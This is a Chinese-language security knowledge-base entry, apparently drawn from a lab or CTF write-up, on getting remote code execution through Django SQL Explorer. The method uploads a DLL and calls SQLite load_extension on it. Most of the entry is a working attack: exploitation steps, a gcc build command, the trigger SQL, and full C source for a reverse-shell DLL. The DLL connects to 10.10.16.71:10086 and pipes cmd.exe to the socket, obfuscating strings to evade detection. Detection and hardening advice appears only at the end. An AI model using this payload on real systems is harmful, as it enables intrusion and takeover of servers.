---
id: web-python-django-sql-explorer-load-extension-dll-rce
title: Django SQL Explorer 后台 SQL 执行：SELECT load_extension 加载上传 DLL 到 RCE
type: scenario
domain: web
path: web/python/framework
technique: django-sql-explorer-sqlite-load-extension-rce
aliases:
- SQL Explorer RCE
- load_extension RCE
- sqlite3_extension_init
- SQLite 扩展加载
- 后台 SQL 控制台
- 上传 DLL 加载
- Eloquia SQL Explorer
tags:
- web
- python
- django
- sql-explorer
- sqlite
- load-extension
- rce
- file-upload
- windows
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V180
  verified_at: '2026-11-06T17:15:44+08:00'
  notes: 已对照原文与图14-24核对：SQL blacklist仅INSERT/CREATE，load_extension('123456')报module not found可调用，banner上传sqll.dll至static/assets/images/blog/，反弹C:\Web\Eloquia；未在本机复跑
---

## 一句话结论

Django SQL Explorer 等后台 SQL 控制台若允许执行 `SELECT load_extension('...')`，且站点存在任意文件上传（示例文章 banner 上传不限类型），攻击者可上传一个导出 `sqlite3_extension_init` 的 DLL，再在 SQL 控制台调用 `load_extension` 让 SQLite 在 Web 进程内加载该 DLL，初始化函数即可执行命令/反弹 shell，获得 Web 用户权限的 RCE。

## 原理

- **SQLite 动态扩展**：SQLite 支持 `load_extension(path)` 动态加载共享库，加载后调用约定入口 `sqlite3_extension_init(db, pzErrMsg, pApi)`；Windows 下是 DLL，Linux 下是 `.so`。
- **SQL 黑名单的盲区**：示例后台只拦截 `INSERT`、`CREATE`（以及尝试的 `ATTACH DATABASE` 建表写入），但没有禁用 `load_extension` 函数；`SELECT load_extension('123456')` 返回 “The specified module could not be found”，说明函数可用、只是文件不存在。关键词黑名单无法覆盖所有危险函数。
- **任意文件上传提供落地点**：文章编辑器的 banner 上传没有文件类型/内容校验，攻击者把 `sqll.dll` 上传到 `static/assets/images/blog/` 等 Web 可读目录，并得到可预测路径；SQLite 以 Web 进程身份读取该路径并 `LoadLibrary`。
- **进程内执行**：DLL 被加载进 Django/SQL Explorer 的 Python 进程（示例 `C:\Web\Eloquia`，用户 `web`），`sqlite3_extension_init` 或 `DllMain` 中创建的线程直接以该进程权限运行；示例用 Winsock 连接攻击者 `10.10.16.71:10086`，把 socket 作为 `cmd.exe` 的 stdin/stdout/stderr，形成交互 shell。
- **免杀/规避**：示例不写 shellcode，只用 Win32 API（`WSAStartup`、`WSASocket`、`connect`、`CreateProcessA`），并把 `cmd.exe` 字符串逐字符写入缓冲区（`buffer[0]='c'; buffer[1]='m'; ...`）以避开静态字符串检测；`gcc -shared -O2 -s` 编译并 strip。
- **为什么可行**：SQL 控制台是管理员功能但常被部署为可直接访问/弱口令；文件上传与 SQL 执行两个“管理员能力”叠加，等价于任意代码执行；SQLite 扩展加载默认可能被 Python 关闭，但一旦应用显式开启或使用了允许扩展的封装，攻击面即成立。

## 触发条件

- 目标使用 Django SQL Explorer（或类似后台 SQL 控制台），且当前账号可执行任意 SELECT/函数调用。
- SQLite 连接启用了扩展加载（`enable_load_extension(True)` / `load_extension()` SQL 函数可用），且未限制扩展目录。
- 存在可上传 DLL/SO 到 Web 进程可读路径的功能（文章 banner、头像、附件），且上传不校验类型/内容。
- 目标为 Windows（示例 DLL）或 Linux（对应 `.so`），架构匹配；Web 进程有权限读取上传文件。
- 攻击者能接收反弹连接，或 DLL 能写文件/执行命令。

## 利用步骤

1. 进入后台 SQL Explorer，测试 `SELECT load_extension('123456');`；若报“module not found”而非“not authorized/disabled”，说明扩展加载可用。
2. 编写 SQLite 扩展 DLL：导出 `sqlite3_extension_init`，在其中创建线程，连接攻击者 IP/端口，`CreateProcessA("cmd.exe", ...)` 并把 socket 作为标准输入输出；字符串逐字符构造以降低静态检测。
3. 编译：`gcc -shared -O2 -s -o sqll.dll sqllite.c -lws2_32`。
4. 通过文章编辑器的 banner/附件上传把 DLL 传到 Web 可读目录（示例 `static/assets/images/blog/sqll.dll`），记录返回路径。
5. 在 SQL Explorer 执行：
   ```sql
   SELECT load_extension('static\assets\images\blog\sqll.dll');
   ```
6. 在攻击机监听对应端口，收到 `cmd.exe` 反弹 shell；确认 `whoami` 为 Web 进程用户（示例 `eloquia\web`）。
7. 后渗透：枚举本地文件/浏览器数据、寻找服务配置与提权路径。

## PoC

DLL 核心：

```c
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_api_routines sqlite3_api_routines;
#define SQLITE_API __declspec(dllexport)
#define SQLITE_CDECL __cdecl

void get_proc_name(char *buffer) {
    buffer[0]='c'; buffer[1]='m'; buffer[2]='d';
    buffer[3]='.'; buffer[4]='e'; buffer[5]='x';
    buffer[6]='e'; buffer[7]='\0';
}

DWORD WINAPI DbMaintenanceTask(LPVOID lpParam) {
    WSADATA wsa; SOCKET sock; struct sockaddr_in server;
    STARTUPINFOA si; PROCESS_INFORMATION pi; char proc_name[16];
    WSAStartup(MAKEWORD(2,2), &wsa);
    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(10086);
    server.sin_addr.s_addr = inet_addr("10.10.16.71");
    connect(sock, (struct sockaddr*)&server, sizeof(server));
    get_proc_name(proc_name);
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcessA(NULL, proc_name, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}

SQLITE_API int SQLITE_CDECL sqlite3_extension_init(
    sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
    HANDLE h = CreateThread(NULL, 0, DbMaintenanceTask, NULL, 0, NULL);
    if (h) CloseHandle(h);
    return 0; // SQLITE_OK
}
```

触发：

```sql
SELECT load_extension('static\assets\images\blog\sqll.dll');
```

原文上传后执行该 SQL，攻击机 `nc -lvnp 10086` 收到 `C:\Web\Eloquia>` 的 `cmd.exe` shell；PoC 未在本机复跑。

## 变体与关联

- 平台变体：Linux 下编译 `.so`，可在 `__attribute__((constructor))` 或 `sqlite3_extension_init` 中执行 `system()`；Windows 下用 DLL。
- SQL 控制台变体：Adminer、phpLiteAdmin、Django SQL Explorer、自定义报表/查询页；只要 `load_extension` 可用且能落地文件即可。
- 落地变体：任意文件上传、日志写文件、SQLite `ATTACH DATABASE` 写文件（若 CREATE 未被禁）、UNC 路径/远程共享加载。
- 关联：[[web-php-rce-pdo-sqlite-loadextension]]（PHP Pdo\Sqlite 的同类 loadExtension RCE）、[[web-python-django-login-eval-base64-user-input-rce]]（Django 代码执行）。
- 边界：Python `sqlite3` 默认禁用扩展加载；若应用未显式 `enable_load_extension(True)` 或编译时未开 `SQLITE_OMIT_LOAD_EXTENSION`，`load_extension` 不可用；上传目录不可读/不可执行时也失败。

## 检测与防御

- 检测：SQL 日志中出现 `load_extension(`；后台查询请求引用 `.dll/.so` 路径；Web 目录出现异常二进制文件；SQL Explorer 账号异常登录/弱口令。
- 修复：禁用 SQLite 扩展加载（`sqlite3_enable_load_extension(False)`、编译 `SQLITE_OMIT_LOAD_EXTENSION`）；SQL 控制台使用只读数据库账号并做函数白名单（禁止 `load_extension`、`ATTACH`、`PRAGMA` 等）。
- 加固：上传接口校验扩展名/内容类型/MIME 并把文件存到不可执行目录；后台强制强口令/MFA；Web 进程降权并限制出网；EDR 监控 `cmd.exe` 由 Python 进程拉起。
